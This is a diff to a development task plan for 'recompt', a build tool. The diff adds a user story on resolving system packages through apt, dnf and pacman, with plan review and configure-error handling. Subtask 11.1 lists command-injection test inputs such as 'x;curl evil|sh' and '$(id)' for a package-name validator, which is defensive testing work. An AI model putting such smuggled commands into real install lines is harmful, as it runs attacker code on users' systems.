@@ -22,8 +22,11 @@
   BuildPlan
 - [recompt/launch.py](../../recompt/launch.py) :: Launch command resolver
 - [recompt/deps.py](../../recompt/deps.py) :: Install proposals
-- [recompt/pkgmgr/](../../recompt/pkgmgr/) :: apt, brew, winget, toolchain
-  table, rustup / Go-archive installers
+- [recompt/pkgmgr/](../../recompt/pkgmgr/) :: apt, dnf, pacman, brew,
+  winget, toolchain table, rustup / Go-archive installers, `resolve.py`
+  (system needs to packages by file lookup)
+- [recompt/configure_errors.py](../../recompt/configure_errors.py) ::
+  Reads missing dependencies from configure output
 - [recompt/proc.py](../../recompt/proc.py) :: Cross-OS process start, time
   limit, process-tree kill
 - [recompt/runners/](../../recompt/runners/) :: Runner interface, factory,
@@ -55,9 +58,10 @@
   are unit-tested on Linux; real Windows/macOS runs happen in 10.4.
 - Domain modules (`detectors`, `planner`, `launch`, `deps`) must not start
   processes or use the network.
-- Neither Podman nor Docker is installed on the development machine
-  (2026-11-24). Subtask 8.14 is the user installing one; every `docker`
-  task comes after it.
+- Rootless Podman is installed on the development machine (8.14 done);
+  ubuntu, fedora and archlinux images run there (2026-11-26).
+- Story 11.0 was added after the 2026-11-26 PRD amendment and comes
+  before 10.0 in the build order.
 - Python 3.11 or later.
 
 ## TDD Planning Guidelines
@@ -584,6 +588,130 @@
       host as it is (libqt6charts6 now installed) [live]; with
       libQt6Charts.so.6 removed from the host list, reports it with package
       libqt6charts6 [simulated: host already has the package] (2026-11-25)
+
+- [ ] 11.0 **User Story:** As a user, I want recompt to find the system
+  packages a project needs even when it has no CI file, using my own
+  Linux distribution's package manager, and to approve the whole plan
+  in one review, so that projects like Dolphin and m64py build without
+  manual installs (PRD amendment and tech design of 2026-11-26) [16/0]
+  - Do this story before 10.0: 10.x tests and benchmarks the finished
+    behaviour. 9.14 is confirmed after 11.15.
+  - [ ] 11.1 Write tests, then make every install command safe: a
+    safe-name check (`^[A-Za-z0-9][A-Za-z0-9+._:-]*$`, optional version
+    suffix where the manager allows it) for package names from CI,
+    Dockerfile, README and resolver; refused names listed; every
+    install command built with `shlex.join` (`pkgmgr/apt.py`,
+    `detectors/ci_common.py`, `detectors/dockerfile.py`). Cases: `x;curl
+    evil|sh`, `$(id)`, a backtick, a name with a space [verify: auto-test]
+  - [ ] 11.2 Add the new and changed models: `SystemNeed`,
+    `ResolvedNeed`, `ProposedPackage`, `Requirement.manager`,
+    `Finding.system_needs`, `BuildPlan.system_needs`,
+    `DetectContext.distro` / `.pkg_manager`, `Source.CONFIGURE`,
+    `ExtractedPlan.packages`, `RunResult.resolved_needs`,
+    `InstallProposal.manager` values `dnf` / `pacman`
+    (`Step.needs_confirm` is removed in 11.12) [verify: code-only]
+  - [ ] 11.3 Write tests, then change image selection: the design's
+    os-release table (Ubuntu, Pop!_OS, Mint, Debian, Kali via
+    `ID_LIKE`, Fedora, Nobara, Arch, Manjaro, unknown) returning image,
+    distribution, manager and whether the family matches the host;
+    the pipeline picks it once and passes it to `make_runner`; a failed
+    pull falls back only within the family, else exit 3; the existing
+    test that expects Fedora to fall back to Ubuntu changes
+    [verify: auto-test]
+  - [ ] 11.4 Write tests, then add the `dnf` and `pacman` adapters and
+    rework `apt` as command templates (`base_setup`, `install`,
+    `index_update`, `search_files`, `search_capability`, `check_name`,
+    `owner_of`) with output parsers tested on the recorded output from
+    the 2026-11-26 smoke test (including `pacman -F`'s two forms);
+    `dnf` and `pacman` columns in the toolchain table; `deps.py` picks
+    the adapter by manager; `ContainerRunner` base setup by manager
+    [verify: auto-test]
+  - [ ] 11.5 Write tests, then extend `ContainerRunner.capture(argv, *,
+    root=False, timeout)`: root user option, `proc.run_process` with a
+    time limit, timeout -> `StepTimeoutError`, Ctrl-C ->
+    `CancelledError`, both removing the container; `index_update`
+    streams its output after a line naming the download and its rough
+    size [verify: auto-test]
+  - [ ] 11.6 Add container smoke tests (marker `container`), one per
+    manager: start the real image, run `base_setup`, `index_update`,
+    search `libudev.pc`, `libudev.h` and `lrelease`, `install` the
+    picked package, `owner_of` a file it installed; record time and
+    index size [verify: docker]
+  - [ ] 11.7 Write tests, then keep package-manager tags through
+    detection and planning: `parse_install` returns the manager and
+    reads `apt`/`apt-get`, `dnf`/`yum`, `pacman -S`, `apk add`, `brew`,
+    `choco`/`winget`; requirements merge on (tool, manager); packages
+    for another manager become `hint` notes; CI install lines are no
+    longer kept as plan steps (`ci_common.py`, `dockerfile.py`,
+    `github_actions.py`, `gitlab_ci.py`, `planner.py`) [verify: auto-test]
+  - [ ] 11.8 Write tests, then extract system needs in `cfamily`:
+    `pkg_check_modules` / `pkg_search_module`, Meson `dependency()`
+    (built-in names skipped), `find_package` with the project's own Find
+    module (`find_path` with `PATH_SUFFIXES`, `find_library`), else
+    `cmake-config` with one need per `COMPONENTS` entry; `${}` and
+    `NAMES` alternatives unresolved; `REQUIRED` vs optional; files read
+    only from the root, `add_subdirectory` targets and module folders,
+    skipping submodules and vendored folders; `if()` tracking with
+    platform and test demotion; case-insensitive commands. Fixtures
+    modelled on Dolphin (`FindLIBUDEV.cmake`, `Externals/`) and
+    Eglantine (`find_package(Qt6 COMPONENTS Charts)`) [verify: auto-test]
+  - [ ] 11.9 Write tests, then add `pkgmgr/resolve.py`: query order
+    (dnf capabilities first, then anchored file patterns), escaping, the
+    container architecture on every search, one `apt-file -f` search,
+    hits mapped back to needs; choice rules in order (wrapper deny-list
+    `WRAPPERS` with a reason per entry, development package, version in
+    the need's name, standard path, highest number, shortest name)
+    tested on the recorded `lrelease`, `libudev` and i686/x86_64
+    results; unknown requirement names become `tool` needs; pass-through
+    names checked with `check_name`; `.pc` guess for built-in Find
+    modules marked "guess"; unresolved needs as warnings; resolved
+    packages added to the proposal with their source [verify: auto-test]
+  - [ ] 11.10 Write tests, then read documents on every run: the pipeline
+    calls the README detector before `build_plan` (the planner's
+    `readme_fallback` goes away); `extract_plan(sections, distro,
+    manager)` in the base, Claude and Ollama backends and the notice
+    wrapper; new system prompt (installs into `packages`, tool and
+    library names into `requirements`, no install steps); setup steps
+    that parse as installs dropped; prose steps dropped when build
+    steps exist; no LLM -> warning and documents skipped
+    [verify: auto-test]
+  - [ ] 11.11 Run the live LLM test (marker `llm`) on the README
+    fixtures plus two new ones: m64py's README (apt line, `lrelease`)
+    and a README with per-distribution sections, checked once with
+    `apt`, `dnf` and `pacman` as the container manager
+    [verify: manual-run-claude]
+  - [ ] 11.12 Write tests, then add the plan review: `UI.review(plan,
+    proposals, resolved) -> bool` and `UI.interactive` replace
+    `confirm_installs` / `confirm_prose`; early exit 5 when not
+    interactive and no `--yes` (except preview); order start -> base
+    setup -> resolve -> review -> steps, all inside the `try/finally`;
+    decline -> exit 5 with no plan step run and the container removed;
+    `--yes` approves; PROSE items, picks, alternatives, rules,
+    unresolved, optional, hints and refused names shown; remove
+    `Step.needs_confirm`; `prompts_asked` excludes reviews; exit code 3
+    no longer used for declined installs (`pipeline.py`, `cli.py`,
+    `report.py` and their tests) [verify: auto-test]
+  - [ ] 11.13 Write tests, then add the configure loop
+    (`configure_errors.py` and the pipeline): full configure output kept
+    in a file; parsers for CMake ("Could NOT find", missing config
+    file), pkg-config, Meson and autotools messages tested on recorded
+    logs (Dolphin's libudev failure among them); resolve, second review
+    of only the new packages (`--yes` approves), install, rerun; at most
+    3 rounds and stop when a round finds nothing new; declined -> exit 1
+    [verify: auto-test]
+  - [ ] 11.14 Write tests, then make the host library check per manager:
+    `ldconfig -p` in the container for the library's path, `owner_of`
+    by manager, the install line in the host's own manager only when the
+    family matches, library names only after the Ubuntu fallback
+    (`hostlibs.py`, `pipeline.py`) [verify: auto-test]
+  - [ ] 11.15 Run the regressions on this machine (Pop!_OS, apt):
+    Dolphin configures past libudev and builds; m64py's `pip install .`
+    finds `lrelease` and returns a launch command; Eglantine still
+    builds and reports `bin/eglantine` [verify: manual-run-claude]
+  - [ ] 11.16 User runs one CMake project with a pkg-config dependency
+    on a Fedora or Arch host (or a Fedora/Arch VM), if one is available;
+    otherwise record that dnf and pacman were checked only by the 11.6
+    smoke tests [verify: manual-run-user]
 
 - [ ] 10.0 **User Story:** As a maintainer, I want end-to-end tests on
   all three OSes, a pinned benchmark set and a README so that success
